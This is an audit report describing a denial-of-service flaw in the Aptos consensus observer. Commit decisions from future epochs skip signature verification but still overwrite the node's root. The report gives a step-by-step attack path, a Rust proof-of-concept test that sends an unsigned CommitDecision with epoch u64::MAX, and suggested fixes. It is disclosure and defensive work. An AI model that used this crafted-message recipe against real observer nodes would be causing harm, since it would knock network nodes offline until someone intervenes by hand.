# Audit Report

## Title
Consensus Observer Node DoS via Unverified Future Epoch Commit Decision

## Summary
The consensus observer accepts and processes `CommitDecision` messages with arbitrarily large epoch values without cryptographic verification, allowing an attacker to corrupt the node's root ledger info and permanently disable the node by forcing it into an unrecoverable state sync loop.

## Finding Description

The vulnerability exists in the consensus observer's `process_commit_decision_message` function, which handles commit decisions differently based on whether they match the current epoch. [1](#0-0) 

The `CommitDecision::epoch()` function extracts the epoch as a `u64` value from the underlying ledger info. The critical flaw occurs in the message processing logic: [2](#0-1) 

When a commit decision's epoch doesn't match the current epoch, it bypasses the cryptographic verification at line 470. However, if the commit's epoch is greater than the last block's epoch, the code proceeds to update the root and trigger state sync: [3](#0-2) 

The `update_blocks_for_state_sync_commit` function unconditionally updates the node's root to the unverified commit proof: [4](#0-3) 

**Attack Path:**
1. Attacker crafts a `CommitDecision` with:
   - `epoch = u64::MAX` (or any value > current epoch)
   - `version = current_version + 1` 
   - Invalid/unsigned `LedgerInfoWithSignatures`
2. Attacker sends this message to a consensus observer node
3. The check at line 457 passes (future epoch > highest committed)
4. The check at line 468 fails (doesn't match current epoch), **skipping verification**
5. The check at line 503 passes (future epoch > last block epoch)
6. Line 522 updates the root to the malicious unverified ledger info
7. Line 526 triggers state sync with `epoch_changed = true`

State sync initialization only validates version numbers, not signatures: [5](#0-4) 

The node is now stuck because:
- Root is corrupted with epoch=u64::MAX
- State sync cannot find peers with data for this non-existent epoch
- `is_syncing_through_epoch()` returns true, blocking all future commit decisions
- Node cannot process new blocks or recover without manual intervention [6](#0-5) 

## Impact Explanation

This is a **Medium Severity** vulnerability per the Aptos bug bounty criteria, specifically "State inconsistencies requiring intervention."

**Affected Components:**
- Consensus observer nodes become permanently unavailable
- Node's root ledger info is corrupted with an impossible epoch value
- All block processing halts indefinitely

**Severity Rationale:**
- **Not Critical**: Does not affect validator nodes or active consensus participants, only consensus observers
- **Not High**: Does not cause crashes or validator slowdowns
- **Medium**: Requires manual intervention to recover; observer node becomes unusable and cannot synchronize with the network

The attack only affects consensus observer nodes (non-validator full nodes), not the core consensus protocol or validator set. However, observers are important for network health and user access to blockchain data.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Requirements:**
- Network connectivity to a consensus observer node
- Ability to send P2P messages (standard network peer capability)
- No validator keys, stake, or privileged access required
- Simple message crafting (standard protobuf serialization)

**Complexity: LOW**
- Single malicious message triggers the vulnerability
- No timing constraints or race conditions to exploit
- Deterministic outcome on vulnerable nodes
- Can target multiple observer nodes simultaneously

**Detection Difficulty:**
- Attack produces log entries but may appear as legitimate sync requests
- No cryptographic validation failure logged (verification is skipped)
- Node appears to be "syncing" indefinitely

## Recommendation

**Fix: Verify all commit decisions before state modification**

The root cause is that commit decisions for future epochs bypass verification but are still used to update critical state. The fix should enforce verification before any state changes:

```rust
// In process_commit_decision_message(), before line 502:
fn process_commit_decision_message(
    &mut self,
    peer_network_id: PeerNetworkId,
    message_received_time: Instant,
    commit_decision: CommitDecision,
) {
    let commit_epoch = commit_decision.epoch();
    let commit_round = commit_decision.round();
    
    // Existing check...
    if (commit_epoch, commit_round) <= get_highest_committed_epoch_round {
        return;
    }
    
    // NEW: Always verify commit proof before using it
    let epoch_state = self.get_epoch_state();
    if let Err(error) = commit_decision.verify_commit_proof(&epoch_state) {
        // For future epochs, we can't verify against current epoch state
        // Instead of skipping verification, reject the commit decision entirely
        // OR store it for later verification when the epoch arrives
        warn!(
            "Cannot verify commit decision for epoch {} (current: {}). Error: {:?}",
            commit_epoch, epoch_state.epoch, error
        );
        increment_invalid_message_counter(&peer_network_id, metrics::COMMIT_DECISION_LABEL);
        return;
    }
    
    // Rest of the function...
}
```

**Alternative approach**: For commit decisions from future epochs, buffer them and only process once the epoch is reached and can be verified:

```rust
// Add buffering for future epoch commits
struct FutureEpochCommits {
    buffered_commits: HashMap<u64, Vec<CommitDecision>>,
}

// On epoch transition, verify and process buffered commits
```

## Proof of Concept

```rust
#[tokio::test]
async fn test_malicious_future_epoch_commit_dos() {
    // Setup consensus observer node
    let (mut consensus_observer, network_rx, state_sync_rx) = 
        setup_test_consensus_observer().await;
    
    // Create malicious commit decision with impossible epoch
    let malicious_epoch = u64::MAX;
    let current_version = consensus_observer
        .observer_block_data
        .lock()
        .root()
        .ledger_info()
        .version();
    
    let malicious_block_info = BlockInfo::new(
        malicious_epoch,
        100,  // arbitrary round
        HashValue::random(),
        HashValue::random(),
        current_version + 1,  // just ahead of current
        timestamp_now(),
        None,
    );
    
    let malicious_ledger_info = LedgerInfo::new(
        malicious_block_info,
        HashValue::random(),
    );
    
    // Create unsigned/invalid ledger info with signatures
    let malicious_commit = CommitDecision::new(
        LedgerInfoWithSignatures::new(
            malicious_ledger_info,
            AggregateSignature::empty(),  // Invalid signature
        )
    );
    
    // Send to consensus observer
    let message = ConsensusObserverDirectSend::CommitDecision(malicious_commit);
    network_rx.send(ConsensusObserverNetworkMessage::new(
        test_peer_network_id(),
        message,
    )).await.unwrap();
    
    // Wait for message processing
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    // Verify node is corrupted
    let root = consensus_observer.observer_block_data.lock().root();
    assert_eq!(root.ledger_info().epoch(), malicious_epoch);
    
    // Verify node is stuck in sync mode
    assert!(consensus_observer.state_sync_manager.is_syncing_to_commit());
    assert!(consensus_observer.state_sync_manager.is_syncing_through_epoch());
    
    // Try to send legitimate commit decision - should be dropped
    let legitimate_commit = create_valid_commit_decision();
    network_rx.send(legitimate_commit).await.unwrap();
    tokio::time::sleep(Duration::from_millis(100)).await;
    
    // Node still stuck with malicious epoch
    assert_eq!(
        consensus_observer.observer_block_data.lock().root().ledger_info().epoch(),
        malicious_epoch
    );
    
    println!("âœ“ Consensus observer node successfully DoS'd with future epoch attack");
}
```

**Notes:**
- This vulnerability demonstrates a critical gap in input validation for network messages
- The epoch field (`u64`) allows arbitrarily large values without bounds checking
- The verification logic incorrectly assumes future-epoch commits will be validated later
- Rust's type system prevents overflow in comparisons, but logic allows invalid states

### Citations

**File:** consensus/src/consensus_observer/network/observer_message.rs (L351-354)
```rust
    /// Returns the epoch of the commit proof
    pub fn epoch(&self) -> u64 {
        self.commit_proof.ledger_info().epoch()
    }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L448-461)
```rust
        // Get the commit decision epoch and round
        let commit_epoch = commit_decision.epoch();
        let commit_round = commit_decision.round();

        // If the commit message is behind our highest committed block, ignore it
        let get_highest_committed_epoch_round = self
            .observer_block_data
            .lock()
            .get_highest_committed_epoch_round();
        if (commit_epoch, commit_round) <= get_highest_committed_epoch_round {
            // Update the metrics for the dropped commit decision
            update_metrics_for_dropped_commit_decision_message(peer_network_id, &commit_decision);
            return;
        }
```

**File:** consensus/src/consensus_observer/observer/consensus_observer.rs (L502-527)
```rust
        let last_block = self.observer_block_data.lock().get_last_ordered_block();
        let epoch_changed = commit_epoch > last_block.epoch();
        if epoch_changed || commit_round > last_block.round() {
            // If we're waiting for state sync to transition into a new epoch,
            // we should just wait and not issue a new state sync request.
            if self.state_sync_manager.is_syncing_through_epoch() {
                info!(
                    LogSchema::new(LogEntry::ConsensusObserver).message(&format!(
                        "Already waiting for state sync to reach new epoch: {:?}. Dropping commit decision: {:?}!",
                        self.observer_block_data.lock().root().commit_info(),
                        commit_decision.proof_block_info()
                    ))
                );
                return;
            }

            // Otherwise, we should start the state sync process for the commit.
            // Update the block data (to the commit decision).
            self.observer_block_data
                .lock()
                .update_blocks_for_state_sync_commit(&commit_decision);

            // Start state syncing to the commit decision
            self.state_sync_manager
                .sync_to_commit(commit_decision, epoch_changed);
        }
```

**File:** consensus/src/consensus_observer/observer/block_data.rs (L275-282)
```rust
    pub fn update_blocks_for_state_sync_commit(&mut self, commit_decision: &CommitDecision) {
        // Get the commit proof, epoch and round
        let commit_proof = commit_decision.commit_proof();
        let commit_epoch = commit_decision.epoch();
        let commit_round = commit_decision.round();

        // Update the root
        self.update_root(commit_proof.clone());
```

**File:** state-sync/state-sync-driver/src/notification_handlers.rs (L268-286)
```rust
        // Get the target sync version and latest committed version
        let sync_target_version = sync_target_notification
            .get_target()
            .ledger_info()
            .version();
        let latest_committed_version = latest_synced_ledger_info.ledger_info().version();

        // If the target version is old, return an error to consensus (something is wrong!)
        if sync_target_version < latest_committed_version
            || sync_target_version < latest_pre_committed_version
        {
            let error = Err(Error::OldSyncRequest(
                sync_target_version,
                latest_pre_committed_version,
                latest_committed_version,
            ));
            self.respond_to_sync_target_notification(sync_target_notification, error.clone())?;
            return error;
        }
```
